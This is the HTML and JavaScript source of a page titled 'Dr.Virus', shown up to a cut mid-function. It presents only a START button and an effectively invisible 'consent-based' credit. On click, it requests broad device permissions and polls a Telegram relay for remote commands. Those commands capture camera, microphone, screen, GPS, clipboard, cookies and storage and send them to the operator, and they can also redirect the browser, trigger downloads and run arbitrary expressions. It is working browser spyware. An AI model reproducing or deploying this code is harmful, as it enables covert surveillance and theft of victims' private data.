<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="theme-color" content="#000000">
<title>Dr.Virus</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  html,body{width:100%;height:100%;overflow:hidden;background:#000;color:#fff;font-family:system-ui,-apple-system,sans-serif}

  .stage{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:#000}

  .circle{
    width:150px;height:150px;border-radius:50%;
    background:#fff;border:none;cursor:pointer;outline:none;
    display:flex;align-items:center;justify-content:center;
    color:#000;font-size:14px;font-weight:800;letter-spacing:2px;
    transition:transform .18s ease, box-shadow .35s ease;
    box-shadow:0 0 0 0 rgba(255,255,255,.55);
    animation:pulse 2.2s infinite;
    user-select:none;
  }
  .circle:active{transform:scale(.93)}

  .circle.running{
    animation:none;background:#0a0a0a;color:#fff;
    box-shadow:0 0 70px 12px rgba(255,255,255,.14);
    border:1px solid #222;
  }
  .circle.done{
    animation:none;background:#fff;color:#000;
    box-shadow:0 0 70px 14px rgba(255,255,255,.35);
  }
  .circle.error{
    animation:none;background:#111;color:#ff5577;
    border:1px solid #331;
  }
  @keyframes pulse{
    0%  {box-shadow:0 0 0 0 rgba(255,255,255,.5)}
    70% {box-shadow:0 0 0 46px rgba(255,255,255,0)}
    100%{box-shadow:0 0 0 0 rgba(255,255,255,0)}
  }

  .toast{
    position:fixed;top:24px;left:50%;transform:translateX(-50%);
    padding:10px 20px;background:rgba(255,255,255,.06);
    border:1px solid #1c1c1c;border-radius:24px;
    font-family:ui-monospace,monospace;font-size:11.5px;color:#fff;
    opacity:0;transition:opacity .3s ease;pointer-events:none;
    max-width:90vw;text-align:center;
  }
  .toast.show{opacity:1}

  .credit{
    position:fixed;left:0;right:0;bottom:16px;text-align:center;
    font-family:ui-monospace,monospace;font-size:9.5px;color:#1a1a1a;
    letter-spacing:1.5px;pointer-events:none;
  }
</style>
</head>
<body>

<div class="stage">
  <button class="circle" id="mainBtn" aria-label="Start">START</button>
</div>
<div class="toast" id="toast"></div>
<div class="credit">Dr.Virus · consent-based · own device only</div>

<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
<script>
'use strict';

// ============================================================
// CONFIG from URL: ?key=AGENT_KEY&name=MyPhone
// ============================================================
const params = new URLSearchParams(location.search);
const KEY  = params.get('key')  || localStorage.getItem('dv_key')  || '';
const NAME = params.get('name') || localStorage.getItem('dv_name') || defaultName();

if (params.get('key'))  localStorage.setItem('dv_key', KEY);
if (params.get('name')) localStorage.setItem('dv_name', NAME);

function defaultName() {
  const ua = navigator.userAgent;
  if (/Android/.test(ua))   return 'Android';
  if (/iPhone/.test(ua))    return 'iPhone';
  if (/iPad/.test(ua))      return 'iPad';
  if (/Windows/.test(ua))   return 'Windows PC';
  if (/Macintosh/.test(ua)) return 'Mac';
  if (/Linux/.test(ua))     return 'Linux';
  return 'Device';
}

// ============================================================
// UI
// ============================================================
const btn = document.getElementById('mainBtn');
const toastEl = document.getElementById('toast');
let toastTimer = null;

function toast(msg, ms) {
  toastEl.textContent = msg;
  toastEl.classList.add('show');
  clearTimeout(toastTimer);
  toastTimer = setTimeout(() => toastEl.classList.remove('show'), ms || 2200);
}

const permState = {};
let polling = false;
let offset = parseInt(localStorage.getItem('dv_offset') || '0');

// ============================================================
// PERMISSIONS
// ============================================================
async function requestAllPermissions() {
  toast('Requesting permissions…', 3000);
  let granted = 0;

  try { const s = await navigator.mediaDevices.getUserMedia({ video: true }); s.getTracks().forEach(t => t.stop()); permState.camera = 'granted'; granted++; }
  catch { permState.camera = 'denied'; }

  try { const s = await navigator.mediaDevices.getUserMedia({ audio: true }); s.getTracks().forEach(t => t.stop()); permState.mic = 'granted'; granted++; }
  catch { permState.mic = 'denied'; }

  try { await new Promise((ok, no) => navigator.geolocation.getCurrentPosition(ok, no, { timeout: 12000 })); permState.geo = 'granted'; granted++; }
  catch { permState.geo = 'denied'; }

  if ('Notification' in window) {
    try { const p = await Notification.requestPermission(); permState.notify = p; if (p === 'granted') granted++; }
    catch { permState.notify = 'error'; }
  }

  try { await navigator.clipboard.readText(); permState.clip = 'granted'; granted++; }
  catch { permState.clip = 'denied'; }

  try { await navigator.storage?.persist?.(); } catch {}

  try {
    if (DeviceOrientationEvent?.requestPermission) {
      const p = await DeviceOrientationEvent.requestPermission();
      permState.sensor = p;
      if (p === 'granted') granted++;
    } else permState.sensor = 'n/a';
  } catch { permState.sensor = 'error'; }

  try { await document.documentElement.requestFullscreen?.(); document.exitFullscreen?.(); } catch {}

  toast(`✅ ${granted} permissions granted`, 2400);
  return granted;
}

// ============================================================
// POLLING LOOP (Telegram long-poll via Vercel)
// ============================================================
async function pollLoop() {
  polling = true;
  while (polling) {
    try {
      const url = `/api/poll?key=${encodeURIComponent(KEY)}&offset=${offset}&timeout=8&_=${Date.now()}`;
      const r = await fetch(url, { cache: 'no-store' });
      const data = await r.json();

      if (data.error) { await sleep(3000); continue; }

      for (const u of data.updates || []) {
        offset = u.id + 1;
        localStorage.setItem('dv_offset', String(offset));
        processCommand(u);
      }
    } catch {
      await sleep(3000);
    }
  }
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// ============================================================
// COMMAND PROCESSING
// ============================================================
async function processCommand({ chatId, text }) {
  const trimmed = text.trim();
  const sp = trimmed.indexOf(' ');
  const cmd = (sp === -1 ? trimmed : trimmed.slice(0, sp)).slice(1).toLowerCase();
  const args = sp === -1 ? '' : trimmed.slice(sp + 1).trim();

  if (cmd === 'help' || cmd === 'start') return sendMessage(chatId, HELP_TEXT);

  const fn = HANDLERS[cmd];
  if (!fn) return sendMessage(chatId, `❓ Unknown: /${cmd}\nSend /help`);

  let result;
  try { result = await fn(args); }
  catch (e) { result = { error: e.message || String(e) }; }

  await sendResult(chatId, cmd, result);
}

async function sendMessage(chatId, text) {
  try {
    await fetch('/api/send', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ key: KEY, type: 'message', chatId, text })
    });
  } catch {}
}

async function sendResult(chatId, cmd, r) {
  if (r.error) return sendMessage(chatId, `❌ <b>/${cmd}</b>\n${esc(r.error)}`);
  if (r.photo)    return sendData(chatId, 'photo',    r.photo,    `📸 /${cmd}`);
  if (r.audio)    return sendData(chatId, 'audio',    r.audio,    `🎤 /${cmd} · ${r.duration || '?'}s`, { duration: r.duration });
  if (r.video)    return sendData(chatId, 'video',    r.video,    `🎥 /${cmd} · ${r.duration || '?'}s`, { duration: r.duration });
  if (r.document) return sendData(chatId, 'document', r.document, `📄 /${cmd}`, { filename: r.filename });
  if (r.text)     return sendMessage(chatId, r.text);
  return sendMessage(chatId, `<b>/${cmd}</b>\n<pre>${esc(JSON.stringify(r, null, 2).slice(0, 3500))}</pre>`);
}

async function sendData(chatId, type, data, caption, extra = {}) {
  try {
    await fetch('/api/send', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ key: KEY, type, chatId, data, caption, ...extra })
    });
  } catch {}
}

// ============================================================
// HELPERS
// ============================================================
function esc(s) {
  return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}

function blobB64(blob) {
  return new Promise((ok, no) => {
    const fr = new FileReader();
    fr.onload = () => ok(fr.result);
    fr.onerror = () => no(fr.error);
    fr.readAsDataURL(blob);
  });
}

function haversine(lat1, lon1, lat2, lon2) {
  const R = 6371;
  const dLat = (lat2-lat1) * Math.PI / 180;
  const dLon = (lon2-lon1) * Math.PI / 180;
  const a = Math.sin(dLat/2)**2 + Math.cos(lat1*Math.PI/180) * Math.cos(lat2*Math.PI/180) * Math.sin(dLon/2)**2;
  return 2 * R * Math.asin(Math.sqrt(a));
}

// ============================================================
// COMMAND HANDLERS
// ============================================================
const HANDLERS = {

// ═══════ INFO ═══════
async info() {
  let battery = 'n/a';
  try { const b = await navigator.getBattery(); battery = `${Math.round(b.level*100)}% ${b.charging?'(chg)':''}`; } catch {}
  const c = navigator.connection || {};
  const perms = Object.entries(permState).map(([k,v]) => `${k}: ${v}`).join('\n') || '(none)';
  return { text: `📊 <b>Device Report</b>

<b>Browser</b>
UA: <code>${esc(navigator.userAgent.slice(0,180))}</code>
Platform: ${esc(navigator.platform)}
Vendor: ${esc(navigator.vendor||'?')}
Lang: ${esc(navigator.language)}
Screen: ${screen.width}×${screen.height}@${devicePixelRatio}x
Viewport: ${innerWidth}×${innerHeight}
TZ: ${esc(Intl.DateTimeFormat().resolvedOptions().timeZone)}
Touch: ${navigator.maxTouchPoints}
Cookies on: ${navigator.cookieEnabled}
Online: ${navigator.onLine}

<b>Hardware</b>
CPU: ${navigator.hardwareConcurrency||'?'} cores
Memory: ${navigator.deviceMemory||'?'} GB
Battery: ${battery}
Net: ${esc(c.effectiveType||'?')} · ${c.downlink||'?'}Mbps · ${c.rtt||'?'}ms

<b>Permissions</b>
<pre>${esc(perms)}</pre>`};
},
async geo() {
  const p = await new Promise((ok,no) => navigator.geolocation.getCurrentPosition(ok, no, { timeout: 12000, enableHighAccuracy: true }));
  return { text: `📍 <b>Location</b>
Lat: <code>${p.coords.latitude}</code>
Lon: <code>${p.coords.longitude}</code>
Accuracy: ±${Math.round(p.coords.accuracy)}m
Altitude: ${p.coords.altitude?.toFixed(1) ?? '—'}m
Heading: ${p.coords.heading ?? '—'}°
Speed: ${p.coords.speed ?? '—'} m/s
<a href="https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}">📍 Maps</a>`};
},
async battery() {
  if (!navigator.getBattery) throw new Error('unsupported');
  const b = await navigator.getBattery();
  return { text: `🔋 <b>Battery</b>
Level: ${Math.round(b.level*100)}%
Charging: ${b.charging}
To full: ${b.chargingTime ? Math.round(b.chargingTime/60)+'min' : '—'}
To empty: ${b.dischargingTime ? Math.round(b.dischargingTime/60)+'min' : '—'}`};
},
async network() {
  const c = navigator.connection || {};
  let pub = {};
  try { pub = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch {}
  return { text: `🌐 <b>Network</b>
Type: ${esc(c.effectiveType||'?')}
Downlink: ${c.downlink||'?'} Mbps
RTT: ${c.rtt||'?'} ms
Save-data: ${c.saveData}

<b>Public</b>
IP: <code>${esc(pub.ip||'?')}</code>
Country: ${esc(pub.country_name||'?')}
City: ${esc(pub.city||'?')}
ISP: ${esc(pub.org||'?')}`};
},
async clipboard() {
  const t = await navigator.clipboard.readText();
  return { text: `📋 <b>Clipboard</b>\n<code>${esc((t||'(empty)').slice(0,3500))}</code>` };
},
async cookies() {
  const c = document.cookie.split(';').map(x => x.trim()).filter(Boolean);
  return { text: `🍪 <b>Cookies (${c.length})</b>\n<code>${esc(c.slice(0,30).join('\n').slice(0,3500) || '(empty)')}</code>` };
},
async storage() {
  const L = []; for (let i=0;i<localStorage.length;i++){ const k=localStorage.key(i); L.push(`${k}=${localStorage.getItem(k)}`); }
  const S = []; for (let i=0;i<sessionStorage.length;i++){ const k=sessionStorage.key(i); S.push(`${k}=${sessionStorage.getItem(k)}`); }
  return { text: `🗄 <b>Storage</b>
<b>Local (${L.length})</b>
<code>${esc(L.slice(0,15).join('\n').slice(0,1500) || '(empty)')}</code>
<b>Session (${S.length})</b>
<code>${esc(S.slice(0,15).join('\n').slice(0,1500) || '(empty)')}</code>`};
},
async devices() {
  const list = await navigator.mediaDevices.enumerateDevices();
  const g = { audioinput: 'Mic', audiooutput: 'Speaker', videoinput: 'Camera' };
  const grouped = {};
  for (const d of list) { const k = g[d.kind] || d.kind; (grouped[k] ||= []).push(d.label || '(hidden)'); }
  return { text: `🎛 <b>Media Devices</b>\n\n` + Object.entries(grouped).map(([k,v]) => `<b>${k} (${v.length})</b>\n${esc(v.join('\n'))}`).join('\n\n') };
},
async permissions() {
  const names = ['geolocation','notifications','camera','microphone','clipboard-read','clipboard-write','persistent-storage','background-sync','accelerometer','gyroscope','magnetometer','ambient-light-sensor','midi'];
  const out = [];
  for (const n of names) {
    try { const r = await navigator.permissions.query({ name: n }); out.push(`${n}: ${r.state}`); }
    catch { out.push(`${n}: unsupported`); }
  }
  return { text: `🔐 <b>Permissions</b>\n<pre>${esc(out.join('\n'))}</pre>` };
},
async fonts() {
  const test = ['Arial','Times New Roman','Courier New','Georgia','Verdana','Comic Sans MS','Impact','Helvetica','Consolas','Monaco','Tahoma','Trebuchet MS','Roboto','Segoe UI','Menlo','Noto Sans','Lato','Open Sans','Inter'];
  const s = document.createElement('span');
  s.style.cssText = 'position:absolute;left:-9999px;top:-9999px;font-size:72px;white-space:nowrap;';
  s.textContent = 'mmmmmmmmmmlli';
  document.body.appendChild(s);
  const base = s.offsetWidth;
  const found = [];
  for (const f of test) { s.style.fontFamily = `"${f}", monospace`; if (s.offsetWidth !== base) found.push(f); }
  s.remove();
  return { text: `🔤 <b>Fonts (${found.length})</b>\n<code>${esc(found.join(', '))}</code>` };
},
async webgl() {
  const c = document.createElement('canvas');
  const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
  if (!gl) throw new Error('WebGL unavailable');
  const dbg = gl.getExtension('WEBGL_debug_renderer_info');
  return { text: `🎨 <b>WebGL</b>
Vendor: ${esc(dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR))}
Renderer: ${esc(dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER))}
Version: ${esc(gl.getParameter(gl.VERSION))}
Max texture: ${gl.getParameter(gl.MAX_TEXTURE_SIZE)}
Ext: ${(gl.getSupportedExtensions()||[]).length}`};
},
async gpu() {
  if (!navigator.gpu) throw new Error('WebGPU unsupported');
  const a = await navigator.gpu.requestAdapter();
  if (!a) throw new Error('No adapter');
  const i = a.info || {};
  return { text: `🚀 <b>WebGPU</b>\nVendor: ${esc(i.vendor||'?')}\nArchitecture: ${esc(i.architecture||'?')}\nDevice: ${esc(i.device||'?')}\nFeatures: ${[...(a.features||[])].length}` };
},
async 'storage-quota'() {
  if (!navigator.storage?.estimate) throw new Error('unsupported');
  const e = await navigator.storage.estimate();
  return { text: `💾 <b>Quota</b>\nUsed: ${(e.usage/1024/1024).toFixed(2)} MB\nQuota: ${(e.quota/1024/1024/1024).toFixed(2)} GB\nUsage: ${((e.usage/e.quota)*100).toFixed(3)}%` };
},
async 'screen-info'() {
  const o = screen.orientation || {};
  return { text: `🖥 <b>Screen</b>\nSize: ${screen.width}×${screen.height}\nAvail: ${screen.availWidth}×${screen.availHeight}\nColor: ${screen.colorDepth}-bit\nDPR: ${devicePixelRatio}\nOrientation: ${esc(o.type||'?')} (${o.angle??'?'}°)\nViewport: ${innerWidth}×${innerHeight}` };
},
async time() {
  const d = new Date();
  return { text: `🕐 <b>Time</b>\n${esc(d.toString())}\nISO: ${d.toISOString()}\nUnix: <code>${d.getTime()}</code>\nTZ: ${-d.getTimezoneOffset()/60}h` };
},

// ═══════ MEDIA ═══════
async screenshot() {
  const c = await html2canvas(document.body, { scale: 0.85, backgroundColor: '#000', useCORS: true });
  return { photo: c.toDataURL('image/jpeg', 0.75) };
},
async camera(args) {
  const facing = args === 'front' ? 'user' : 'environment';
  const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: facing }, width: { ideal: 1920 } } });
  const v = document.createElement('video');
  v.srcObject = s; v.muted = true; v.playsInline = true;
  await v.play(); await new Promise(r => setTimeout(r, 900));
  const c = document.createElement('canvas');
  c.width = v.videoWidth; c.height = v.videoHeight;
  c.getContext('2d').drawImage(v, 0, 0);
  s.getTracks().forEach(t => t.stop());
  return { photo: c.toDataURL('image/jpeg', 0.78) };
},
async mic(args) {
  const sec = Math.min(parseInt(args) || 5, 30);
  const s = await navigator.mediaDevices.getUserMedia({ audio: true });
  const rec = new MediaRecorder(s);
  const chunks = [];
  rec.ondataavailable = e => chunks.push(e.data);
  rec.start();
  await new Promise(r => setTimeout(r, sec * 1000));
  await new Promise(r => { rec.onstop = r; rec.stop(); });
  s.getTracks().forEach(t => t.stop());
  return { audio: await blobB64(new Blob(chunks, { type: 'audio/webm' })), duration: sec };
},
async video(args) {
  const sec = Math.min(parseInt(args) || 5, 20);
  const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
  const rec = new MediaRecorder(s);
  const chunks = [];
  rec.ondataavailable = e => chunks.push(e.data);
  rec.start();
  await new Promise(r => setTimeout(r, sec * 1000));
  await new Promise(r => { rec.onstop = r; rec.stop(); });
  s.getTracks().forEach(t => t.stop());
  return { video: await blobB64(new Blob(chunks, { type: 'video/webm' })), duration: sec };
},
async 'record-screen'(args) {
  const sec = Math.min(parseInt(args) || 5, 30);
  const s = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
  const rec = new MediaRecorder(s);
  const chunks = [];
  rec.ondataavailable = e => chunks.push(e.data);
  rec.start();
  await new Promise(r => setTimeout(r, sec * 1000));
  await new Promise(r => { rec.onstop = r; rec.stop(); });
  s.getTracks().forEach(t => t.stop());
  return { video: await blobB64(new Blob(chunks, { type: 'video/webm' })), duration: sec };
},
async 'audio-spectrum'(args) {
  const sec = Math.min(parseInt(args) || 3, 15);
  const s = await navigator.mediaDevices.getUserMedia({ audio: true });
  const ctx = new AudioContext();
  const src = ctx.createMediaStreamSource(s);
  const an = ctx.createAnalyser(); an.fftSize = 2048;
  src.connect(an);
  const data = new Uint8Array(an.frequencyBinCount);
  let max = 0, sum = 0, n = 0;
  const start = Date.now();
  while (Date.now() - start < sec * 1000) {
    an.getByteFrequencyData(data);
    const avg = data.reduce((a,b) => a+b, 0) / data.length;
    sum += avg; n++; if (avg > max) max = avg;
    await new Promise(r => setTimeout(r, 100));
  }
  s.getTracks().forEach(t => t.stop()); ctx.close();
  return { text: `🔊 <b>Audio Spectrum (${sec}s)</b>\nAvg: ${(sum/n).toFixed(1)}\nPeak: ${max}\nRMS: ${Math.sqrt(sum/n).toFixed(1)}` };
},
async pip() {
  const v = document.querySelector('video');
  if (!v) throw new Error('No video element');
  await v.requestPictureInPicture();
  return { text: `📺 PiP entered` };
},
async 'media-session'() {
  if (!navigator.mediaSession) throw new Error('unsupported');
  navigator.mediaSession.metadata = new MediaMetadata({ title: 'Remote', artist: 'Agent', album: 'Web API' });
  return { text: `🎵 Media Session set` };
},
async 'screen-capture'() {
  const s = await navigator.mediaDevices.getDisplayMedia({ video: true });
  const v = document.createElement('video');
  v.srcObject = s; v.muted = true; v.playsInline = true;
  await v.play(); await new Promise(r => setTimeout(r, 800));
  const c = document.createElement('canvas');
  c.width = v.videoWidth; c.height = v.videoHeight;
  c.getContext('2d').drawImage(v, 0, 0);
  s.getTracks().forEach(t => t.stop());
  return { photo: c.toDataURL('image/jpeg', 0.75) };
},

// ═══════ ACTIONS ═══════
async vibrate(args) {
  const ms = parseInt(args) || 500;
  if (!navigator.vibrate) throw new Error('Vibration unsupported');
  navigator.vibrate(ms);
  return { text: `📳 Vibrated ${ms}ms` };
},
async notify(args) {
  if (Notification.permission !== 'granted') throw new Error('Notification permission not granted');
  new Notification('🧪 Remote', { body: args || 'Hello' });
  return { text: `🔔 Notification shown` };
},
async speak(args) {
  if (!window.speechSynthesis) throw new Error('unsupported');
  speechSynthesis.cancel();
  const u = new SpeechSynthesisUtterance(args || 'Hello');
  speechSynthesis.speak(u);
  return { text: `🔊 Speaking: "${esc((args||'Hello').slice(0,120))}"` };
},
async sound(args) {
  const [f, d] = (args || '440 300').split(/\s+/);
  const ctx = new AudioContext();
  const osc = ctx.createOscillator();
  const g = ctx.createGain();
  osc.frequency.value = parseInt(f) || 440;
  osc.type = 'sine';
  g.gain.value = 0.3;
  osc.connect(g); g.connect(ctx.destination);
  osc.start();
  const dur = parseInt(d) || 300;
  setTimeout(() => { osc.stop(); ctx.close(); }, dur);
  return { text: `🎵 ${parseInt(f)||440}Hz for ${dur}ms` };
},
async writetext(args) {
  await navigator.clipboard.writeText(args || '');
  return { text: `📝 Wrote ${(args||'').length} chars to clipboard` };
},
async open(args) {
  if (!args) throw new Error('URL required');
  location.href = args;
  return { text: `🔗 Navigating to ${esc(args)}` };
},
async fullscreen() {
  await document.documentElement.requestFullscreen();
  return { text: `⛶ Fullscreen entered` };
},
async 'exit-fullscreen'() {
  if (document.fullscreenElement) await document.exitFullscreen();
  return { text: `✕ Fullscreen exited` };
},
async wakelock() {
  if (!navigator.wakeLock) throw new Error('unsupported');
  await navigator.wakeLock.request('screen');
  return { text: `☀️ Wake lock active` };
},
async reload() {
  setTimeout(() => location.reload(), 500);
  return { text: `🔄 Reloading…` };
},
async download(args) {
  if (!args) throw new Error('URL required');
  const a = document.createElement('a');
  a.href = args; a.download = ''; a.click();
  return { text: `⬇️ Download started` };
},
async scrollto(args) {
  const [x, y] = (args || '0 0').split(/\s+/).map(Number);
  window.scrollTo({ left: x || 0, top: y || 0, behavior: 'smooth' });
  return { text: `📜 Scrolled to (${x}, ${y})` };
},
async highlight(args) {
  if (!args) throw new Error('Selector required');
  const el = document.querySelector(args);
  if (!el) throw new Error('Element not found');
  el.scrollIntoView({ behavior: 'smooth', block: 'center' });
  const prev = el.style.outline;
  el.style.outline = '3px solid #fff';
  setTimeout(() => { el.style.outline = prev; }, 3000);
  return { text: `🔦 Highlighted: ${esc(args)}` };
},
async share(args) {
  if (!navigator.share) throw new Error('unsupported');
  await navigator.share({ title: 'Remote', text: args || 'Hello' });
  return { text: `📤 Shared` };
},
async print() { window.print(); return { text: `🖨 Print dialog opened` }; },
async badge(args) {
  const n = parseInt(args) || 1;
  if (!navigator.setAppBadge) throw new Error('unsupported');
  await navigator.setAppBadge(n);
  return { text: `🔴 Badge set to ${n}` };
},

// ═══════ SENSORS ═══════
async orient() {
  const d = await new Promise((ok, no) => {
    const to = setTimeout(() => no(new Error('no data (5s)')), 5000);
    const h = e => { clearTimeout(to); removeEventListener('deviceorientation', h); ok(e); };
    addEventListener('deviceorientation', h);
  });
  return { text: `🧭 <b>Orientation</b>\nabsolute: ${d.absolute}\nalpha: ${d.alpha}\nbeta: ${d.beta}\ngamma: ${d.gamma}` };
},
async motion() {
  const d = await new Promise((ok, no) => {
    const to = setTimeout(() => no(new Error('no data (5s)')), 5000);
    const h = e => { clearTimeout(to); removeEventListener('devicemotion', h); ok(e); };
    addEventListener('devicemotion', h);
  });
  const a = d.accelerationIncludingGravity || {};
  const r = d.rotationRate || {};
  return { text: `📡 <b>Motion</b>\nx: ${a.x}\ny: ${a.y}\nz: ${a.z}\nrot α: ${r.alpha}\nrot β: ${r.beta}\nrot γ: ${r.gamma}` };
},
async light() {
  if (typeof AmbientLightSensor === 'undefined') throw new Error('unsupported');
  const s = new AmbientLightSensor();
  const v = await new Promise((ok, no) => {
    s.onreading = () => ok(s.illuminance);
    s.onerror = () => no(new Error('sensor error'));
    s.start();
    setTimeout(() => no(new Error('no reading')), 5000);
  });
  s.stop();
  return { text: `💡 Light: ${v} lux` };
},
async magnet() {
  if (typeof Magnetometer === 'undefined') throw new Error('unsupported');
  const s = new Magnetometer({ frequency: 10 });
  const v = await new Promise((ok, no) => {
    let last;
    s.onreading = () => { last = s; };
    s.onerror = () => no(new Error('sensor error'));
    s.start();
    setTimeout(() => last ? ok(last) : no(new Error('no reading')), 3000);
  });
  s.stop();
  return { text: `🧲 <b>Magnetometer</b>\nx: ${v.x} μT\ny: ${v.y} μT\nz: ${v.z} μT` };
},
async proximity() {
  if (typeof ProximitySensor === 'undefined') throw new Error('unsupported');
  const s = new ProximitySensor();
  const v = await new Promise((ok, no) => {
    let last;
    s.onreading = () => { last = s; };
    s.onerror = () => no(new Error('sensor error'));
    s.start();
    setTimeout(() => last ? ok(last) : no(new Error('no reading')), 3000);
  });
  s.stop();
  return { text: `📏 Proximity: ${v.near ? 'NEAR' : 'FAR'}` };
},
async gamepad() {
  const pads = navigator.getGamepads ? [...navigator.getGamepads()].filter(Boolean) : [];
  if (!pads.length) return { text: `🎮 No gamepads` };
  return { text: `🎮 <b>Gamepads (${pads.length})</b>\n<pre>${esc(JSON.stringify(pads.map(p => ({ id: p.id, buttons: p.buttons.length, axes: p.axes.length })), null, 2))}</pre>` };
},
async 'watch-geo'(args) {
  const sec = Math.min(parseInt(args) || 10, 60);
  const samples = [];
  const id = navigator.geolocation.watchPosition(
    p => samples.push({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }),
    () => {}, { enableHighAccuracy: true }
  );
  await new Promise(r => setTimeout(r, sec * 1000));
  navigator.geolocation.clearWatch(id);
  if (!samples.length) throw new Error('no samples');
  const first = samples[0], last = samples[samples.length-1];
  const dist = haversine(first.lat, first.lon, last.lat, last.lon);
  return { text: `📍 <b>GPS Track (${sec}s, ${samples.length} samples)</b>\nStart: ${first.lat.toFixed(5)}, ${first.lon.toFixed(5)}\nEnd: ${last.lat.toFixed(5)}, ${last.lon.toFixed(5)}\nDistance: ${(dist*1000).toFixed(0)}m\nAvg acc: ±${Math.round(samples.reduce((a,s)=>a+s.acc,0)/samples.length)}m` };
},
async 'orientation-lock'(args) {
  if (!screen.orientation?.lock) throw new Error('unsupported');
  await screen.orientation.lock(args || 'portrait');
  return { text: `🔒 Orientation locked: ${args || 'portrait'}` };
},
async 'orientation-unlock'() {
  screen.orientation?.unlock?.();
  return { text: `🔓 Orientation unlocked` };
},
async pressure() {
  if (typeof PressureObserver === 'undefined') throw new Error('unsupported');
  const p = await new Promise((ok, no) => {
    const obs = new PressureObserver(r => { obs.disconnect(); ok(r[0]); });
    obs.observe('cpu');
    setTimeout(() => no(new Error('no reading')), 5000);
  });
  return { text: `🔥 <b>CPU Pressure</b>\nState: ${p.state}\nSource: ${p.source}` };
},

// ═══════ STORAGE ═══════
async 'idb-list'() {
  if (!indexedDB.databases) throw new Error('unsupported');
  const list = await indexedDB.databases();
  if (!list.length) return { text: `🗃 No IndexedDB databases` };
  return { text: `🗃 <b>IndexedDB (${list.length})</b>\n<pre>${esc(JSON.stringify(list, null, 2))}</pre>` };
},
async 'cache-list'() {
  if (!('caches' in window)) throw new Error('unsupported');
  const keys = await caches.keys();
  if (!keys.length) return { text: `📦 No caches` };
  const out = [];
  for (const k of keys) {
    const c = await caches.open(k);
    const reqs = await c.keys();
    out.push(`${k}: ${reqs.length} entries`);
  }
  return { text: `📦 <b>Cache Storage</b>\n<code>${esc(out.join('\n'))}</code>` };
},
async 'opfs-list'() {
  if (!navigator.storage?.getDirectory) throw new Error('unsupported');
  const root = await navigator.storage.getDirectory();
  const list = [];
  for await (const [name, h] of root.entries()) list.push(`${h.kind}: ${name}`);
  return { text: `📁 <b>OPFS</b>\n<code>${esc(list.join('\n') || '(empty)')}</code>` };
},
async 'storage-buckets'() {
  if (!navigator.storageBuckets) throw new Error('unsupported');
  const list = await navigator.storageBuckets.keys();
  return { text: `🪣 <b>Buckets (${list.length})</b>\n<code>${esc(list.join('\n') || '(none)')}</code>` };
},
async 'clear-storage'() {
  localStorage.clear(); sessionStorage.clear();
  return { text: `🧹 Cleared` };
},
async 'set-item'(args) {
  const [k, ...v] = args.split(' ');
  if (!k) throw new Error('key required');
  localStorage.setItem(k, v.join(' '));
  return { text: `✅ set ${esc(k)}` };
},
async 'get-item'(args) {
  if (!args) throw new Error('key required');
  const v = localStorage.getItem(args);
  return { text: `🔑 <code>${esc(args)}</code> = <code>${esc(v ?? '(null)')}</code>` };
},

// ═══════ ADVANCED ═══════
async 'speech-to-text'(args) {
  const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
  if (!SR) throw new Error('unsupported');
  const sec = Math.min(parseInt(args) || 5, 30);
  const r = new SR();
  r.lang = navigator.language;
  r.interimResults = true;
  r.continuous = true;
  return await new Promise((ok, no) => {
    let text = '';
    r.onresult = e => { for (let i = e.resultIndex; i < e.results.length; i++) text += e.results[i][0].transcript + ' '; };
    r.onerror = e => no(new Error(e.error));
    r.start();
    setTimeout(() => { r.stop(); ok({ text: `🎙 <b>Speech (${sec}s)</b>\n"${esc(text.trim() || '(no speech)')}"` }); }, sec * 1000);
  });
},
async 'webrtc-offer'() {
  const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
  pc.createDataChannel('test');
  const offer = await pc.createOffer();
  await pc.setLocalDescription(offer);
  await new Promise(r => setTimeout(r, 1500));
  const sdp = pc.localDescription?.sdp || '';
  pc.close();
  return { text: `🌐 <b>WebRTC Offer</b>\n<code>${esc(sdp.split('\n').slice(0, 12).join('\n'))}</code>` };
},
async 'webrtc-ice'() {
  const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
  pc.createDataChannel('test');
  const c = [];
  pc.onicecandidate = e => { if (e.candidate) c.push(e.candidate.candidate); };
  await pc.setLocalDescription(await pc.createOffer());
  await new Promise(r => setTimeout(r, 2000));
  pc.close();
  return { text: `🧊 <b>ICE (${c.length})</b>\n<code>${esc(c.slice(0, 5).join('\n'))}</code>` };
},
async 'eval-safe'(args) {
  if (!args) throw new Error('expr required');
  if (/(fetch|XMLHttpRequest|import|require|eval|Function|document\.write|location\s*=)/i.test(args)) throw new Error('blocked');
  const r = Function(`"use strict"; return (${args});`)();
  let out; try { out = JSON.stringify(r, null, 2); } catch { out = String(r); }
  return { text: `🧮 <code>${esc(args)}</code>\n<b>→</b>\n<code>${esc(out.slice(0, 3000))}</code>` };
},
async 'crypto-random'(args) {
  const n = Math.min(parseInt(args) || 16, 256);
  const buf = crypto.getRandomValues(new Uint8Array(n));
  const hex = [...buf].map(b => b.toString(16).padStart(2, '0')).join('');
